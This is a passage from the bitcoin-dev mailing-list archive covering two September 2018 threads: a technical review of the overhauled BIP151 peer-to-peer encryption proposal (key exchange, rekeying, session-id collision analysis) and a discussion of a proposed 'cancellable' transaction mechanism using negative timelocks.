In general, the entire thing is a little bit underspecified. (I'm aware it's just a draft.)
A few examples:
 - What should a peer do if the MAC verification fails?
 - What should a peer do if it receives an even key?
 - "Processing the message before the authentication succeeds (MAC verified) MUST not be done."
 That should also apply to the ciphertext. (Or: What is a "message"?). It may be a good idea to
 to refer to the openssh document or steal from it; it does a pretty good job.
 - "Both peers MUST keep track of the message sequence number (uint32) of sent and received
 messages for building a 64-bit symmetric cipher IV." I think you mean nonce when you say IV?
 - What is the initial value of the sequence number?
 - How is a 64-bit nonce formed from one (two?) uint32?
 - What if the uint32 overflows?
 - "Re-Keying interval is a peer policy with a minimum timespan of 10 seconds." What if I receive
 too many re-keying requests? Nothing or should I raise the DoS score?
 - "The Re-Keying must be done after every 1GB of data sent or received" Hm, every peer updates its
 own sending key, so this should just read "sent" instead of "sent or received"?

Pseudocode could probably help here.

[1] https://eprint.iacr.org/2014/043.pdf


From freedom at reardencode.com  Thu Sep  6 20:32:44 2018
From: freedom at reardencode.com (Brandon Smith)
Date: Thu, 6 Sep 2018 13:32:44 -0700
Subject: [bitcoin-dev] A BIP proposal for transactions that are
 'cancellable'
In-Reply-To: <CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
Message-ID: <20180906203244.GQ62902@hank.reardencode.com>

I made a similar proposal about 7 months ago, and documented some of the
discussion points here:

https://github.com/reardencode/bips/blob/reverselocktime/bip-0zzz.mediawiki

On 2018-09-06 (Thu) at 15:16:34 +0000, Gregory Maxwell via bitcoin-dev wrote:
> Functionality such as this does not currently exist not because no one
> thought of it before, but because it has been proposed many times
> before and determined to be harmful.  The existing design of CLTV/CSV
> were carefully constructed to make it impossible for a transaction to
> go from valid to invalid based on the time. The most naive
> construction-- e.g. push the current time/height on the stack-- would
> have that property and was specifically avoided.
> 
> When a spend goes from valid to invalid it means that a reorganization
> will destroy coins even completely absent any dishonest actions of the
> coins prior owner in the coins recent casual history. Effectively a
> coin with any kind of non-monotone validity event in its recent
> history functions like a recently generated coin: a coin that reorgs
> destroy. Bitcoin addresses the issue for recently generated coins by
> not permitting their use for 100 blocks.  I've yet to see an argument
> for a use case for non-monotone validity that still sounds useful once
> the negative effects are addressed (e.g. by subjecting coins that have
> gone through them to a maturity limitation).
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev

From papawnana4541 at gmail.com  Fri Sep  7 05:02:29 2018
From: papawnana4541 at gmail.com (Terry McLaughlin)
Date: Fri, 7 Sep 2018 00:02:29 -0500
Subject: [bitcoin-dev] A BIP proposal for transactions that are
	'cancellable'
In-Reply-To: <20180906203244.GQ62902@hank.reardencode.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
	<20180906203244.GQ62902@hank.reardencode.com>
Message-ID: <CAHDfhJpt2Uust5LFX5GyGHDqP_NR9u7a=PUDTgN74zUxZK-A-g@mail.gmail.com>

Please help me guide me in the direction I need to go

On Thursday, September 6, 2018, Brandon Smith via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> I made a similar proposal about 7 months ago, and documented some of the
> discussion points here:
>
> https://github.com/reardencode/bips/blob/reverselocktime/bip-0zzz.
> mediawiki
>
> On 2018-09-06 (Thu) at 15:16:34 +0000, Gregory Maxwell via bitcoin-dev
> wrote:
> > Functionality such as this does not currently exist not because no one
> > thought of it before, but because it has been proposed many times
> > before and determined to be harmful.  The existing design of CLTV/CSV
> > were carefully constructed to make it impossible for a transaction to
> > go from valid to invalid based on the time. The most naive
> > construction-- e.g. push the current time/height on the stack-- would
> > have that property and was specifically avoided.
> >
> > When a spend goes from valid to invalid it means that a reorganization
> > will destroy coins even completely absent any dishonest actions of the
> > coins prior owner in the coins recent casual history. Effectively a
> > coin with any kind of non-monotone validity event in its recent
> > history functions like a recently generated coin: a coin that reorgs
> > destroy. Bitcoin addresses the issue for recently generated coins by
> > not permitting their use for 100 blocks.  I've yet to see an argument
> > for a use case for non-monotone validity that still sounds useful once
> > the negative effects are addressed (e.g. by subjecting coins that have
> > gone through them to a maturity limitation).
> > _______________________________________________
> > bitcoin-dev mailing list
> > bitcoin-dev at lists.linuxfoundation.org
> > https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180907/3fc1ce9c/attachment.html>

From a.ranchalpedrosa at gmail.com  Fri Sep  7 07:07:25 2018
From: a.ranchalpedrosa at gmail.com (Alejandro Ranchal Pedrosa)
Date: Fri, 7 Sep 2018 09:07:25 +0200
Subject: [bitcoin-dev] A BIP proposal for transactions that are
 'cancellable'
In-Reply-To: <029a8e95-a265-451d-5417-957d685fa9ce@mattcorallo.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<8CA4E834-061C-4EE9-A69D-CAE69A08FE7D@mattcorallo.com>
	<CABaiX-2L9oVdta=aRH91uE=iPRv4cX6zU0=+oF+2oWqnu=64YQ@mail.gmail.com>
	<029a8e95-a265-451d-5417-957d685fa9ce@mattcorallo.com>
Message-ID: <14a4d701-54d3-34b0-8eed-07efafd0061c@gmail.com>

Yes I agree with what you mean but this requires Alice to broadcast an 
additional transaction. Also, Alice is supposed to be able to 'cancel' 
the transaction in the first 24hours, not after them.

Best,

Alejandro.

On 9/6/18 6:33 PM, Matt Corallo wrote:
> I think you misunderstood my proposal. What you'd do is the transaction
> is spendable by either Bob OR (Bob AND Alice) and before
> broadcast/during construction/whatever sign a new transaction that
> spends it and is only spendable by Alice, but is timelocked for 24
> hours. At the 24h mark, Alice broadcasts the transaction and once it is
> confirmed only Alice can claim the money.
>
> On 09/06/18 10:59, Alejandro Ranchal Pedrosa wrote:
>> Dear Matt,
>>
>> Notice that what you suggest has some substantial differences. With your
>> suggestion of a multisig option with a 24h timelock, once you give Alice
>> the chance to spend that UTXO without a negative timelock (as we argue),
>> by means of, say, a transaction that she can use, you cannot enforce
>> that this is not used by Alice after the 24hs. Perhaps it is possible,
>> tweaking the Lightning Channel design of Breach Remedy txs, to penalize
>> Alice if she does this, but this requires Bob to check the Blockchain in
>> case he needs to publish a proof-of-fraud, think of adding extra funds
>> to the transaction to account for penalization, etc.
>>
>> Feel free to correct me if I got it wrong in your email.
>>
>> Best,
>> Alejandro.
>>
>>
>> On Thu, Sep 6, 2018 at 3:32 PM Matt Corallo <lf-lists at mattcorallo.com
>> <mailto:lf-lists at mattcorallo.com>> wrote:
>>
>>      I think a simple approach to what you want to accomplish is to
>>      simply have a multisig option with a locktime pre-signed transaction
>>      which is broadcastable at the 24h mark and has different
>>      spendability. This avoids introducing reorg-induced invalidity.
>>
>>      On September 6, 2018 9:19:24 AM UTC, Alejandro Ranchal Pedrosa via
>>      bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org
>>      <mailto:bitcoin-dev at lists.linuxfoundation.org>> wrote:
>>
>>          Hello everyone,
>>
>>          We would like to propose a new BIP to extend OP_CSV (and/or OP_CLTV) in
>>          order for these to allow and interpret negative values. This way,
>>          taking the example shown in BIP 112:
>>
>>          HASH160 <revokehash> EQUAL
>>          IF
>>           ??? <Bob's pubkey>
>>          ELSE
>>           ??? "24h" CHECKSEQUENCEVERIFY DROP
>>           ??? <Alice's pubkey>
>>          ENDIF
>>          CHECKSIG
>>
>>          that gives ownership only to Bob for the first 24 hours and then to
>>          whichever spends first, we basically propose using the negative bit value:
>>
>>          HASH160 <revokehash> EQUAL
>>          IF
>>           ??? <Bob's pubkey>
>>          ELSE
>>           ??? "-24h" CHECKSEQUENCEVERIFY DROP
>>           ??? <Alice's pubkey>
>>          ENDIF
>>          CHECKSIG
>>
>>          meaning that both would have ownership for the first 24 hours, but
>>          after that only Bob would own such coins. Its implementation should
>>          not be too tedious, and in fact it simply implies considering negative
>>          values that are at the moment discarded as for the specification of
>>          BIP-112, leaving the sign bit unused.
>>
>>          This, we argue, an increase the fairness of the users, and can at times
>>          be more cost-effective for users to do rather than trying a Replace-By-Fee
>>          transaction, should they want to modify such payment.
>>
>>          We would like to have a discussion about this before proposing the
>>          BIP, for which we are preparing the text.
>>
>>          You can find our paper discussing it here:
>>          https://hal-cea.archives-ouvertes.fr/cea-01867357 (find attached as well)
>>
>>          Best,
>>

From a.ranchalpedrosa at gmail.com  Fri Sep  7 07:12:40 2018
From: a.ranchalpedrosa at gmail.com (Alejandro Ranchal Pedrosa)
Date: Fri, 7 Sep 2018 09:12:40 +0200
Subject: [bitcoin-dev] A BIP proposal for transactions that are
 'cancellable'
In-Reply-To: <20180906203244.GQ62902@hank.reardencode.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
	<20180906203244.GQ62902@hank.reardencode.com>
Message-ID: <caa38174-5bd9-74dd-deaa-3feb7a10822b@gmail.com>

Hi all,

Thank you for the link, and also to Gregory for the remarks. I did not 
know about this previous proposal. I think the last paragraph of future 
work is interesting:

"It may be interesting to add enhance OP_CHECKSEQUENCEVERIFY 
<https://github.com/bitcoin/bips/blob/master/bip-0112.mediawiki> to 
allow outputs that are spendable by Alice until time foo, always 
spendable by Bob, and spendable by Joe only after time bar, or other 
such cases"

Perhaps it would allow this functionality, while keeping the validity of 
coins, if the new OP_zzz took an additional argument than suggested, 
such that the first one is the timelimit for Alice to keep the coin (say 
in the first 24 hours), and after those 24 hours the ownership goes to 
the third argument, say Bob.

That is, it is not possible to use only specifying the owner in the 
first 24 hours. Would this be considered harmful?

Best,

Alejandro.

On 9/6/18 10:32 PM, Brandon Smith wrote:
> ade a similar proposal about 7 months ago, and documented some of the
> discussion points here:
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180907/f3f28537/attachment.html>

From crypto at timruffing.de  Fri Sep  7 13:00:08 2018
From: crypto at timruffing.de (Tim Ruffing)
Date: Fri, 07 Sep 2018 15:00:08 +0200
Subject: [bitcoin-dev] Overhauled BIP151
In-Reply-To: <CAAS2fgQPkR63FmUyP8mAkmv4D-ttJ1C3rZismNr9_takBRS1qQ@mail.gmail.com>
References: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
	<061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>
	<CAAS2fgQPkR63FmUyP8mAkmv4D-ttJ1C3rZismNr9_takBRS1qQ@mail.gmail.com>
Message-ID: <d48a1f9bf13ff19e73ffafbe62f590f86e9b9c66.camel@timruffing.de>

On Fri, 2018-09-07 at 02:31 +0000, Gregory Maxwell wrote:
> Currently, Tor provides _no confidentiality at all_ in that threat
> model.  Part of why I think this enhancement is interesting is
> because
> without it BIP151 doesn't actually add anything for those p2p
> connections running over Tor, but with it -- it at least adds some
> long term confidentiality hedge.
> 
Okay, sure, I was assuming that Tor will deploy it at some point. No
idea what the status is.

> > It's not worth the hassle, would hinder adoption,
> 
> Why do you say this?
My assumption is that NewHope is harder to implement. If you just 
drop-in existing code, it's not. And I've neither implemented NewHope
nor Elligator Squared, so I may just be wrong.

> 
> > impression of "bulletproof" security. Even worse, there will be too
> > many people that will suddenly
> > assume that Bitcoin is post-quantum secure.
> 
> People already make that claim with respect to public key hashing.  I
> don't think "we shouldn't improve security because someone will
> mistake an improvement for perfection" is an an especially
> interesting
> argument.

I don't like the argument either but I think it's real.

> (Blockstream  previously wrote the SW forward transform for asset
> generation, but this requires the inverse too, as well as glue code.
> It also isn't clear to me if it's possible to make this construction
> constant time, which would be okay for BIP151 purposes but if we
> wanted to have a generic uniform encoder in libsecp256k1 I think we'd
> prefer it be constant time? maybe?)
No idea if it can be made constant time but yeah I think it's not
crucial in this case.

> 
> I don't believe that indistinguishable keys are actually useful
> outside of the context of things like stegnographic embedding-- cases
> where protocol 'metadata' doesn't tell you that a key is there
> regardless.

I wasn't specific but my point is that these are indeed interesting
future directions. You can easily make the traffic look like any other
protocol which uses encryption. That's a really useful property if you
want to avoid censorship, even if traffic analysis still works. That's
true even if this it's not in the scope of this BIP, which is of course
the case.

If you ask me, that is more interesting than protecting against
potential decryption of P2P connections in a few decades. But I don't
have a definitive argument for this of course.


> I also prefer the contributory key model, but Pieter proved me on IRC
> last week that the attack form that I was concerned about was not
> possible.
> 
> Do you actually have an attack in mind that you can spell out
> here?  I
> don't see a harm in changing that, but given that I'd already twice
> talked myself out of proposing the same thing, I'd like to understand
> if I'm missing something. :)

I don't have a harmful example but here is harmless one (that you
probably know because it's really the simplest one can think of):

A             M             B 
   -- aG -->
                 <-- bG --
                  -- aG -->
  <-- bG --

Now A and B share the same session id but any attempt to communicate
will fail because they both think that they're the initiator. Of course
that's not a big deal because M is in neither of those sessions. So
it's not an attack but it's a weird property of the key exchange. But I
think it's desirable to avoid such things if the cost to do so is very
low.

Also, here is a better argument:

A             M             B 
   -- aG -->
                 <-- bG --
  <-- xG --
                  -- yG -->

After B's message, M's goal is create a collision of the session ids.
Since M can freely choose x and y, that's a birthday attack on the hash
function and needs 2^(l/2) work if the session id is l bits long.

Telegram has (had?) the same issue:
https://www.alexrad.me/discourse/a-264-attack-on-telegram-and-why-a-super-villain-doesnt-need-it-to-read-your-telegram-chats.html

With the other variant, M cannot collect both aG and bG upfront:

A             M             B 
   -- aG -->
                  -- yG -->
                 <-- bG --
  <-- xG --

Now M can only choose x, so this is a second-preimage attack and takes
2^l work. So with the this variant, you can have a session id that's
only half the size. That's a real difference if session ids are meant
to be comparable by humans, e.g., over the phone. 

(I think) it's possible to even go further with a 3-way handshake:
A                M                B 
   -- H(aG) -->
                    -- H(yG) -->
                   <--  bG   --
  <--  xG   --
   --  aG   -->
                    --  yG   -->

Here M has no flexibility at all, so the probability of a successful
attack against a single key exchange is just 2^(-l). This is similar to
ZRTP. I'm not saying that we should do this, it's something worth
noting that.

  
> 
> > Re-keying
> > =========
> > The problem with signalling re-keying in the length field is that
> > the length field is not covered
> > by the MAC.
> 
> It's AAD data in the mac, unless I misunderstand the protocol.

Oh nevermind.

> Personally I'd prefer that we used a ciphersuite that effectively
> "rekeyed" every message-- along the lines of the constructions
> described https://blog.cr.yp.to/20170723-random.html   Unfortunately
> I
> was unable to find _any_ well analyized  authenticated encryption
> mode
> that has the fast erasure property.   It's too bad because it would
> be
> trivial to adhoc one (e.g. use the extra 32 bytes from the poly1305
> chacha run to update the keys for the next message).

That adhoc construction is a very interesting idea. Hm... Just fyi, the
closest that comes to my mind is:
https://core.ac.uk/download/pdf/20880831.pdf

> The norm in Bitcoin is to ignore messages you don't know how to parse
> anyways,  so there is no complexity that arises from "may negotiate"
> itself-- only from actually making use of that possibility in the
> future, so the merits of any particular usage could be decided when
> something wants to actually use it.  The purpose of pointing out "may
> negotiate" is, I think, primarily to avoid a debate about who would
> assign numbers from this limited space in the future-- and the answer
> just is that they're implementation defined (e.g. by the BIPs using
> them).

Yeah, my point was not to write the entire list in stone. That was not
really clear from my message, sorry. Of course, new message types can
be added later. But I don't see a big advantage in allowing both ASCII
strings and short IDs. So I wanted to say that the usage of short IDs
should be written stone.

On Fri, 2018-09-07 at 10:34 +0200, Jonas Schnelli wrote:
> 
> > I didn't think about this in detail: maybe there are a few
> meaningful cases where padding could
> > hide the message length without too much overhead. (I'm not
> convinced, just a random thought.)
> 
> I think a new message type that could contain message + pad would be
> trivial.
> Would this again be to obfuscate traffic patterns? Anti DPI is not
> the scope of BIP151.

Well, it's indeed to obfuscate traffic patterns but primarily for
confidentiality. If I see the length of the message, I can guess the
message type fairly well for example. (That's not no matter if my goal
as an attacker is to break your privacy or to censor your connection.
Of course more confidentiality helps also against DPI/censorship but
that was not my point here.)

> I was under the false impression that it is obvious to disconnect in
> those cases.

Yeah I think it's by far the most natural thing to do but it may be
better to make it explicit.

Tim


From dev at jonasschnelli.ch  Fri Sep  7 08:34:13 2018
From: dev at jonasschnelli.ch (Jonas Schnelli)
Date: Fri, 7 Sep 2018 10:34:13 +0200
Subject: [bitcoin-dev] Overhauled BIP151
In-Reply-To: <061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>
References: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
	<061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>
Message-ID: <AA90A688-1419-450D-A80D-03469226BBE6@jonasschnelli.ch>

Hi Tim

Thanks for the feedback.

I agree with all of Gregs answers.

> key. Together with the encrypted packet lengths, the entire data stream looks like random then,
> which is pretty useful against censorship resistance for example. (The only exception is that the
> stream will never start with the magic bytes.)

All-or-none censorship attacks are out of scope for BIP151.
We won?t achieve DPI robustness in this proposal and I think it should not be part of the p2p protocol.

I think all-or-one censorship situations require an additional layer like TOR with OBFS4 (where AFAIK Eligator is used).
Eventually Core does directly support non-tor routed pluggable transports (it's partially already possible via SOCK proxy, but not on a gossip and plugin-launch level).

This does not exclude that we should obfuscate the key exchange as good as we can without blowing up the implementation too much.

The proposed encryption adds a robustness to the thread model with very little costs and low risks.

>   "salt = BitcoinSharedSecret||INITIATOR_PUBKEY||RESPONDER_PUBKEY" should just avoid this issue.

This is a good point and I?d like to see more concrete examples how this (the non dynamic salt) could be exploited.

> Re-keying
> =========
> The problem with signalling re-keying in the length field is that the length field is not covered
> by the MAC. So the attacker can flip the signalling bit. The resulting protocol is probably still
> secure but the malleability is certainly not desirable.

In ChaCha20Poly1305 at openssh, the length field is AAD, encrypted with a different key and part of the MAC.

> 
> Deterministic rekeying rules may be better. Otherwise there will be implementations that rekey
> every 10 seconds and implementations that just don't rekey at all (rendering the 10 s rekeying
> interval in the opposite direction useless). Different policies also make it possible to
> fingerprint implementations. Another problem is that people will set their policies arbitrarily.
> What's better: 5 min or 30 min? I don't know, but both are reasonable choices. (Thats's very much
> like discussions about ciphers... What's better AES-GCM or ChaCha20/Poly1305? I don't know, but
> again both are reasonable choices.)

The Rekey cost is two times a double-SHA256,? the costs of a rekey is similar to one or two v1 INV message creations.

> 
> Symmetric crypto
> ================
> You call it chacha20-poly1305 at bitcoin but what's the difference to the openssh then? Is the
> idea to save a call to chacha here as you mentioned?
> 
> I didn't think about this in detail: maybe there are a few meaningful cases where padding could
> hide the message length without too much overhead. (I'm not convinced, just a random thought.)

I think a new message type that could contain message + pad would be trivial.
Would this again be to obfuscate traffic patterns? Anti DPI is not the scope of BIP151.

> 
> Misc
> ====
> "The ID/string mapping is a peer to peer arrangement and MAY be negotiated between the
> requesting and responding peer." I think that's overly complicated. I suggest it should just be
> written in stone, again to avoid complexity and to avoid fingerprinting. New implementations are
> necessary anyway, so maybe just use IDs for anything? ASCII is nice if you want to debug your code
> or some random network failure but that's hard anyway when encryption is used.

I wanted to avoid too much central planing here and only cover the ones where it's most efficient (small messages that are used often).
The ASCII commands are in itself somehow pseude-robust against collision.
For a 1MB block message, using a 1-byte short ID (rather then a 6-byte ASCII command) would reduce the bandwidth requirement insignificant (99.99952%).

If we would always have used short IDs in the past, there could have been a collision between XTIN, compact, sendheaders or so.

> 
> In general, the entire thing is a little bit underspecified. (I'm aware it's just a draft.)
> A few examples:
> - What should a peer do if the MAC verification fails?
> - What should a peer do if it receives an even key?
> - "Processing the message before the authentication succeeds (MAC verified) MUST not be done."
> That should also apply to the ciphertext. (Or: What is a "message"?). It may be a good idea to
> to refer to the openssh document or steal from it; it does a pretty good job.
> - "Both peers MUST keep track of the message sequence number (uint32) of sent and received
> messages for building a 64-bit symmetric cipher IV." I think you mean nonce when you say IV?
> - What is the initial value of the sequence number?

Good points. Will make them more clear in the BIP.
I was under the false impression that it is obvious to disconnect in those cases.

> - How is a 64-bit nonce formed from one (two?) uint32?

That?s specified in ChaCha20Poly1305 at openssh ("a nonce consisting of the packet sequence number encoded as a uint64?).
But I?ll specified that more clear.

> - What if the uint32 overflows?

The max data before rekey is 1GB, AFAIK it is impossible to overflow.

> - "Re-Keying interval is a peer policy with a minimum timespan of 10 seconds." What if I receive
> too many re-keying requests? Nothing or should I raise the DoS score?

Current implementation proposal does a disconnect. With the risk of fingerprinting options, I think we can leave this open to the implementation?

> - "The Re-Keying must be done after every 1GB of data sent or received" Hm, every peer updates its
> own sending key, so this should just read "sent" instead of "sent or received??

Yes. Should probably be ?sent?,? and eventually a paragraph that states that a peer should disconnect if the remote peer did not rekey within that limit.

> Pseudocode could probably help here.

Agree. Will try to add.

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 833 bytes
Desc: Message signed with OpenPGP
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180907/348e23e8/attachment.sig>

From freedom at reardencode.com  Fri Sep  7 12:51:35 2018
From: freedom at reardencode.com (Brandon Smith)
Date: Fri, 7 Sep 2018 05:51:35 -0700
Subject: [bitcoin-dev] A BIP proposal for transactions that are
 'cancellable'
In-Reply-To: <caa38174-5bd9-74dd-deaa-3feb7a10822b@gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>
	<20180906203244.GQ62902@hank.reardencode.com>
	<caa38174-5bd9-74dd-deaa-3feb7a10822b@gmail.com>
Message-ID: <20180907125135.GR62902@hank.reardencode.com>

I believe you may be missing the overall points in the "Nail In the
Coffin" and "Temporary Discussion" sections. In summary:

1: Any UTXO spending a script with an expiration must be treated
similarly to Coinbase (I proposed a solution to this, but it's complex
and may have unforeseen implications).

2: All existing software assumes that a transaction once valid stays
valid. Any proposal to change this must ensure that existing wallets and
users aren't immediately open to being scammed by malicious actors
sending low fee expiring transactions.

The more tenable ways to move forward on improving the ecosystem around
delayed transactions and refunds are: Lightning, improved fee
estimation, and improved mempool eviction / re-propagation resistance.

The original reason that I began looking into this is because I noticed
that during high fee periods, transactions could re-propagate between
mempools of differing policies resulting in coins being stuck unusable
for far longer than the expected 1-2 week eviction. I don't know of any
concrete work going into investigating or improving this.

HTH,

--Brandon

On 2018-09-07 (Fri) at 09:12:40 +0200, Alejandro Ranchal Pedrosa wrote:
> Hi all,
> 
> Thank you for the link, and also to Gregory for the remarks. I did not 
> know about this previous proposal. I think the last paragraph of future 
> work is interesting:
> 
> "It may be interesting to add enhance OP_CHECKSEQUENCEVERIFY 
> <https://github.com/bitcoin/bips/blob/master/bip-0112.mediawiki> to 
> allow outputs that are spendable by Alice until time foo, always 
> spendable by Bob, and spendable by Joe only after time bar, or other 
> such cases"
> 
> Perhaps it would allow this functionality, while keeping the validity of 
> coins, if the new OP_zzz took an additional argument than suggested, 
> such that the first one is the timelimit for Alice to keep the coin (say 
> in the first 24 hours), and after those 24 hours the ownership goes to 
> the third argument, say Bob.
> 
> That is, it is not possible to use only specifying the owner in the 
> first 24 hours. Would this be considered harmful?
> 
> Best,
> 
> Alejandro.
> 
> On 9/6/18 10:32 PM, Brandon Smith wrote:
> > ade a similar proposal about 7 months ago, and documented some of the
> > discussion points here:

From greg at xiph.org  Fri Sep  7 02:31:15 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Fri, 7 Sep 2018 02:31:15 +0000
Subject: [bitcoin-dev] Overhauled BIP151
In-Reply-To: <061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>
References: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
	<061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>
Message-ID: <CAAS2fgQPkR63FmUyP8mAkmv4D-ttJ1C3rZismNr9_takBRS1qQ@mail.gmail.com>

On Thu, Sep 6, 2018 at 11:33 PM Tim Ruffing via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
> Now you can argue that the attacker is storing encrypted traffic today to decrypt it later.

That is the argument. We know for that state level parties are storing
unimaginable amounts of data for future decryption, that threat isn't
theoretical.

> Sure,
> but if that's your threat model then Bitcoin is probably not the right tool for you. (And if

Why not?

> you insist that Bitcoin is the right tool, then you can and probably should use it over Tor
> anyway.)

Currently, Tor provides _no confidentiality at all_ in that threat
model.  Part of why I think this enhancement is interesting is because
without it BIP151 doesn't actually add anything for those p2p
connections running over Tor, but with it -- it at least adds some
long term confidentiality hedge.

> It's not worth the hassle, would hinder adoption,

Why do you say this?

> impression of "bulletproof" security. Even worse, there will be too many people that will suddenly
> assume that Bitcoin is post-quantum secure.

People already make that claim with respect to public key hashing.  I
don't think "we shouldn't improve security because someone will
mistake an improvement for perfection" is an an especially interesting
argument.

> Key exchange indistinguishable from random
> ==========================================
> I would rather love to see a simple ECDH key exchange as currently used but with an encoding of
> public key that provides indistinguishability from random bitstrings. "Elligator" does not work
> but "Elligator Squared" [1] does the job for secp256k1 -- it just doubles the size of the public

Here is where I turn the argument around on you:   This requires
writing a non-trivial amount of moderately complex new cryptographic
code (which is not the case for PQ schemes-- that merely requires
dropping in pre-existing code) and yet I am not aware of any attack
model that this which would any improvement in actually delivered
security:  Bitcoin traffic is _trivially_ identifiable by its traffic
patterns.

(Blockstream  previously wrote the SW forward transform for asset
generation, but this requires the inverse too, as well as glue code.
It also isn't clear to me if it's possible to make this construction
constant time, which would be okay for BIP151 purposes but if we
wanted to have a generic uniform encoder in libsecp256k1 I think we'd
prefer it be constant time? maybe?)

The scheme in the BIP thus far achieves the property that there are no
fixed bytes for brain-dead byte matching DPI traffic filtering or
anti-virus to match on (or accidentally false positive on).  AV false
positives are already an existing problem with the current protocol
and any fixed bytes in the communication are at risk for false
positives or targeted filtering.   And achieving that property
requires basically nothing: a test for the first byte of a generated
serialized pubkey and a negate on the private key if it was wrong.

> key. Together with the encrypted packet lengths, the entire data stream looks like random then,

No, it doesn't-- due to traffic analysis.  Including, for example, the
pattern that 64-bytes must be sent in each direction, before further
data continues, bursts of traffic coinciding with blocks newly found
on the network, etc.

I don't believe that indistinguishable keys are actually useful
outside of the context of things like stegnographic embedding-- cases
where protocol 'metadata' doesn't tell you that a key is there
regardless.

I suppose if the code already existed to do it I might as well go
"okay, sure why not", it's not going to harm anything (the added
computation time to generate the uniform encoding would probably be no
more than a 10% slowdown).  I wouldn't argue against it on the basis
that someone might believe it resulted in anti-censorship properties
that it doesn't have ... even though it's clearly the case... because
I categorically reject that form of argument. :)

I think your view on the two distinctive proposals is askew: PQ
agreement has a clear benefit under a plausible threat model and is
quite easy to implement... while uniform encoding is somewhat harder
to implement (though admittedly not very hard) but doesn't appear to
provide a concrete benefit under any threat model that I'm currently
aware of...

> The key derivation can be improved. It should include each peer's understanding of its role,
> i.e., requester (or "initiator" is the more common term) or responder. At the moment, an attacker
> can create a situation where two peers think they're in the same session (with the same session
> id) but they're actually not. Also, it's possible for an attacker to rerandomize the public keys.
> That's nothing bad by itself but anything which restricts the flexibility of the attacker without
> adding complexity is a good idea. Something like
>    "salt = BitcoinSharedSecret||INITIATOR_PUBKEY||RESPONDER_PUBKEY" should just avoid this issue.

I also prefer the contributory key model, but Pieter proved me on IRC
last week that the attack form that I was concerned about was not
possible.

Do you actually have an attack in mind that you can spell out here?  I
don't see a harm in changing that, but given that I'd already twice
talked myself out of proposing the same thing, I'd like to understand
if I'm missing something. :)

> Re-keying
> =========
> The problem with signalling re-keying in the length field is that the length field is not covered
> by the MAC.

It's AAD data in the mac, unless I misunderstand the protocol.

> Deterministic rekeying rules may be better. Otherwise there will be implementations that rekey
> every 10 seconds

That would be pretty harmless, since the rekeying operation costs
similar to one message decryption.

> and implementations that just don't rekey at all (rendering the 10 s rekeying
> interval in the opposite direction useless).

The protocol requires rekeying at least after a given amount of data
is transmitted. Peers that violate that can be disconnected. But it
could be unfortunately infrequent.

> Different policies also make it possible to
> fingerprint implementations.

I agree that is a good point.

Personally I'd prefer that we used a ciphersuite that effectively
"rekeyed" every message-- along the lines of the constructions
described https://blog.cr.yp.to/20170723-random.html   Unfortunately I
was unable to find _any_ well analyized  authenticated encryption mode
that has the fast erasure property.   It's too bad because it would be
trivial to adhoc one (e.g. use the extra 32 bytes from the poly1305
chacha run to update the keys for the next message).

> What's better: 5 min or 30 min? I don't know, but both are reasonable choices. (Thats's very much

It doesn't much matter, except for fingerprinting reasons.

> like discussions about ciphers... What's better AES-GCM or ChaCha20/Poly1305? I don't know, but
> again both are reasonable choices.)

Here we have a very clear motiviation.  On devices without hardware
AES/clmul constant time AES-GCM is _terribly slow_ compared to
ChaCha20/Poly1305. Performance on the slowest devices is where the
the ones where the ciphersuite choice likely matters at all (because
it could actually make a meaningful difference in their system's
ability to keep up), and the slowest devices that I'm aware of users
commonly using are also devices without good AES-GCM performance.
Unfortunately.

On fast desktop hardware the performance of AES-GCM and
ChaCha20/Poly1305 is also fairly close.

So when it matters, chacha20/poly1305 is higher performance by a wide
margin.  (Too bad, because otherwise I'd much rather use AES-GCM)

> I didn't think about this in detail: maybe there are a few meaningful cases where padding could
> hide the message length without too much overhead. (I'm not convinced, just a random thought.)

This can be done at the message level. E.g. new TX messages that round
tx sizes up to the next multiple. I don't think useful low overhead
padding is otherwise possible.


> written in stone, again to avoid complexity and to avoid fingerprinting.

